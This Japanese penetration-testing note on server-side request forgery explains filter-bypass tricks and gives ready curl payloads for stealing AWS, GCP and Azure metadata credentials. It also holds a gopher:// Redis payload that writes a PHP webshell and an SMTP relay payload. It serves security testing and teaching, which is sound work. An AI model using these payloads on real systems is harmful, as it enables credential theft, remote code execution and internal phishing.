# SSRF（Server-Side Request Forgery）

## 概要

サーバーに任意のURLへHTTPリクエストを送らせる脆弱性。外部から直接アクセスできない内部サービスへのアクセスや、クラウドメタデータの取得に使われる。

---

## 着火条件

- URLを入力するフォームがある（「画像URL」「Webhook URL」「プロキシ」など）
- パラメータに `url=`, `redirect=`, `target=`, `dest=` が含まれている
- 「外部リソースを取得する」機能がある

---

## 観点・着眼点

**サーバーが自分のかわりにリクエストを投げていないか確認：**
1. `http://[自分のIP]` で受信リクエストを監視（テスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を `ip a` で確認して使う。詳細 → `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①））
2. `url=http://127.0.0.1/` を試して内部アクセスができるか確認
3. `url=http://169.254.169.254/` でクラウドメタデータエンドポイントを試す

**レスポンス・挙動から次のアクションを判断する：**

| 観測される挙動 | 示唆 | 次のアクション |
|-------------|-----|------------|
| `http://127.0.0.1:[PORT]/` にポート番号を変えて送ると、レスポンス本文やサイズが毎回変わる | 内部ポートスキャンが成立 | 開いているポートに対応する内部サービスの特定へ |
| `169.254.169.254` へのアクセスで IMDSv1 のメタデータが返る | AWS EC2 / OpenStack 環境で IMDSv1 が有効 | `iam/security-credentials/` まで到達して一時クレデンシャル取得 |
| `169.254.169.254` で 401 / 403 が返る | IMDSv2 が強制 → `X-aws-ec2-metadata-token` ヘッダーが必要 | トークンを取る経路をアプリ側が制御できるか確認 |
| リクエストは投げられるがレスポンスが戻らない（ステータス固定・本文なし） | Blind SSRF | 自分の公開 HTTP サーバーへのコールバック・DNS ルックアップで到達を確認。受信手段 → `XSS.md`（攻撃側の準備）の `python3 -m http.server 8000` を参照 |
| `file://` や `gopher://` のスキーム切替でエラー文言が変わる | スキームホワイトリストが緩い | プロトコル悪用（Redis・内部 SMTP 等）へ進む |
| `http://0177.0.0.1/` / 整数表記 / `[::1]` で挙動が変わる | パーサの正規化が甘い | フィルタバイパス系のペイロードを系統的に試す |
| `http://0177.0.0.1/` (8進数) や `http://0x7f000001/` (16進数) で内部 IP チェックを通過する | サーバ側のフィルタが「IP として解析できない形式は無視」のパターン（典型バグ）。別表記は解析失敗するので素通り → その後 HTTP クライアントが実際の 127.0.0.1 に到達 | 8進数・16進数・整数表記 (`http://2130706433/`) を順に試す |
| `http://[::ffff:127.0.0.1]/` で SSRF できる advisory を見たけど自分の検証では通らない | 対象環境の Python が 3.11.9 / 3.12.4 以降。これらのバージョンから IPv4-mapped IPv6 が自動展開され loopback 判定が効くようになった | 対象の Python バージョン要件を確認。古い Python なら通る可能性 |
| 外部ホスト経由 302 → `127.0.0.1` で到達できる | フォロー先の再検証なし | DNS リバインディング / リダイレクト経由の内部到達 |

---

## 手順

**基本的な内部アクセス試行：**
```bash
# localhostの内部サービスにアクセス
curl "http://[TARGET]/fetch?url=http://127.0.0.1:8080"
curl "http://[TARGET]/fetch?url=http://localhost/admin"

# 内部ネットワークのスキャン
curl "http://[TARGET]/fetch?url=http://192.168.1.1"
```

**クラウドメタデータの取得（AWS / GCP / Azure で経路が異なる点に注意）：**

```bash
# AWS EC2 (IMDSv1)
curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# AWS EC2 (IMDSv2): セッショントークンが必要・ヘッダ注入できないアプリ構造だと成立しない
# 1) PUT で token 取得 → 2) GET にヘッダで添える、の 2 段
curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/api/token" \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -X PUT
# → token 取得後に X-aws-ec2-metadata-token ヘッダを付けて GET（アプリ側がヘッダ送信を許可する設計の場合のみ）

# GCP Compute Engine: Metadata-Flavor ヘッダ必須（無いと拒否）
curl "http://[TARGET]/fetch?url=http://metadata.google.internal/computeMetadata/v1/" \
  -H 'Metadata-Flavor: Google'
# サービスアカウントトークン取得（GCP の中心目的）
curl "http://[TARGET]/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H 'Metadata-Flavor: Google'
# ホスト名は metadata.google.internal が標準だが、169.254.169.254 でも到達可

# Azure Instance Metadata Service (IMDS): Metadata: true ヘッダ必須 + api-version 必須
curl "http://[TARGET]/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H 'Metadata: true'
# Azure マネージド ID のトークン取得
curl "http://[TARGET]/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H 'Metadata: true'

# Alibaba Cloud / Oracle Cloud / IBM Cloud も同 169.254.169.254 を使うが API パスが各社固有
```

> **クラウドメタデータ攻撃の前提:** AWS IMDSv2 / GCP `Metadata-Flavor: Google` / Azure `Metadata: true` の各ヘッダ要求は SSRF 防御として機能している。**アプリ側で任意ヘッダを attacker 制御可能な経路（URL に含まれるヘッダ注入 / `Headers:` パラメータ受付）が無いと刺さらない**。CRLF injection 経由のヘッダ注入や、proxy が独自に Metadata-Flavor 等を付与する誤設定もあり得るため、各経路で試す価値はある。

**フィルター回避テクニック：**
```bash
# IPの別表記
http://0177.0.0.1/             # 127.0.0.1の8進数表記
http://0x7f000001/             # 127.0.0.1の16進数表記
http://2130706433/             # 127.0.0.1の整数表記
http://[::1]/                  # IPv6のlocalhost
http://[::ffff:127.0.0.1]/     # IPv4-mapped IPv6（古いPython環境でのみ通る）

# 公開 wildcard DNS で「ホスト名は外部・解決結果は内部」を作る
# nip.io / sslip.io は <IP>.nip.io / <IP>.sslip.io の形式で任意 IP に解決する公開サービス
http://127.0.0.1.nip.io/        # → 127.0.0.1 に解決
http://127.0.0.1.sslip.io/      # 同上、HTTPS 用 wildcard 証明書も提供
http://10.0.0.5.nip.io/         # 内部 RFC1918 アドレスにも展開可能
# 「ホスト名が攻撃者ドメイン → 解決後の IP が内部」というパターンで
# ホスト名ベースのブラックリストを抜けつつ実 IP は内部に向かう
# DNS 経由なので攻撃者が DNS サーバを建てなくても済む手軽さが利点

# DNS rebinding（解決のたびに IP が変わる）
# 1) アプリが name → IP 解決 → 検証（外部 IP として通過） → 2) 実際の接続前にもう一度解決 → 内部 IP
# rbndr.us 公開サービス: <hex-ip1>.<hex-ip2>.rbndr.us が交互に 2 つの IP を返す
# Singularity of Origin（OSS ツール、Node.js）でローカルに rebinding サーバを建てられる
# https://github.com/nccgroup/singularity （別途インストール要）
```

**8進数・16進数・整数表記がなぜ通るのか:**

サーバ側のフィルタが「ipaddress ライブラリで IP として解析 → 解析失敗したら素通り」
というパターンを持っていると、`0177.0.0.1` や `0x7f000001` は解析エラーになって
内部 IP チェックを完全に飛ばす。その後 HTTP クライアントが文字列をホスト名として
名前解決し、結果として実際の 127.0.0.1 に届く。だから別表記が「localhost に届く」。

**IPv4-mapped IPv6 (`::ffff:127.0.0.1`) は Python のバージョン依存:**

Python 3.11.9 / 3.12.4 未満では `is_loopback=False` を返していたため SSRF 防御を
bypass できた。それ以降のバージョンは自動展開されて loopback 判定が効くようになり、
新しい Python 環境ではこの経路は通らない。advisory を読むときは対象環境の
Python バージョン要件を必ず確認する。

```bash
# リダイレクトを使ったバイパス
# 自分のサーバーに http://127.0.0.1 へのリダイレクトを設定してそのURLを入力
```

**`gopher://` を使った任意 TCP プロトコル送信（重要な攻撃面）：**

`gopher://` スキームを HTTP クライアントが受け入れる環境（古い libcurl ベースのアプリ・PHP の `file_get_contents` / Java の `URLConnection` 一部）では、**生の TCP バイトを任意ホスト・任意ポートに送信**できる。HTTP / Redis / SMTP / MySQL の wire protocol を `gopher://` で組み立てれば、内部サービスへの任意コマンド実行に直結する。

```bash
# Redis (port 6379) に FLUSHALL + SET / CONFIG SET dir で webshell 書込
# gopher://内部ホスト:6379/_<CRLF-encoded redis 文を URL encode>
curl "http://[TARGET]/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aFLUSHALL%0d%0a*3%0d%0a%243%0d%0aSET%0d%0a%241%0d%0a1%0d%0a%2429%0d%0a%0a%0a%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E%0a%0a%0d%0a*4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%243%0d%0adir%0d%0a%2413%0d%0a%2Fvar%2Fwww%2Fhtml%0d%0a*4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*1%0d%0a%244%0d%0aSAVE%0d%0a"

# SMTP (port 25) で内部メール送信（外部送信踏み台 / 内部フィッシング配信）
curl "http://[TARGET]/fetch?url=gopher://127.0.0.1:25/_HELO%20attacker%0d%0aMAIL%20FROM%3A%3Cattacker%40example.test%3E%0d%0aRCPT%20TO%3A%3Cvictim%40example.test%3E%0d%0aDATA%0d%0aSubject%3A%20test%0d%0a%0d%0apwned%0d%0a.%0d%0aQUIT%0d%0a"

# MySQL（認証パケットを組み立てる必要があり煩雑だが PoC 多数）/ Memcached / PostgreSQL も同様
```

ペイロード生成には **Gopherus**（OSS、Python、別途インストール `git clone https://github.com/tarunkant/Gopherus`）を使うのが定石。`gopher://[HOST]:[PORT]/_[CRLF-encoded-payload]` の URL を自動生成してくれる。Redis / MySQL / SMTP / Zabbix / FastCGI / Memcached / PostgreSQL に対応。

```bash
# [Attacker] Gopherus で Redis 用 gopher URL を生成
python3 gopherus.py --exploit redis
# → /var/www/html/shell.php に PHP webshell を書く gopher URL を出力
```

**gopher:// が刺さらないとき:** 多くの最新 HTTP クライアントは gopher を無効化済み。代替として `dict://`（Memcached / Redis に簡易コマンド送信可）、CRLF injection で HTTP リクエスト内に追加プロトコル行を注入する方法を検討。

---

## 注意点・落とし穴

- サーバーがDNSを使ってホスト名を解決する場合、DNSリバインディング攻撃が有効なことがある
- プロトコルも変えてみる（`file://`, `gopher://`, `dict://`）
- レスポンスが返ってこない「Blind SSRF」の場合でも、タイミング差でアクセス可否を判断できる
- IMDSv2 が強制されている環境では、単純な GET では 401 が返る。ヘッダー注入ができないアプリ構造だと成立しない
- アプリ側が `urllib.parse` などで 1 回だけパースして最終 URL を決めている場合、`@` を使った `http://trusted.com@127.0.0.1/` 型で騙せることがある
- 失敗パターンの記録：`url=` に `http://127.0.0.1` を素で投げて 400 / 「invalid host」が返る環境は、ホワイトリスト・スキーム検査が効いている。IP 別表記やリダイレクト経由でないと通らない

---

## 関連技術

- 前：外部URLを受け付けるパラメータ（`url=` / `redirect=` 等）を発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：内部ポートに到達できた → 対象サービスの脆弱性を調査 → `../../01_Reconnaissance/Network_Scanning.md`（内部ポートの意味を確認）
- 後：クラウドメタデータから一時クレデンシャル取得 → `../Credential_Discovery.md`
- 後：プロトコル切替で内部 SMTP 等に到達 → `../Mail_Services.md`
- 関連：パストラバーサルと併発しやすい（同じ「入力URL/パス」系の脆弱性） → `./Path_Traversal.md`
- 関連：Blind SSRF のコールバック受信手段（python3 -m http.server）→ `./XSS.md`（攻撃側の準備セクション）
- 関連：攻撃側の準備・到達可能 IP の確認 → `../../06_Concepts/Reverse_Shell.md`
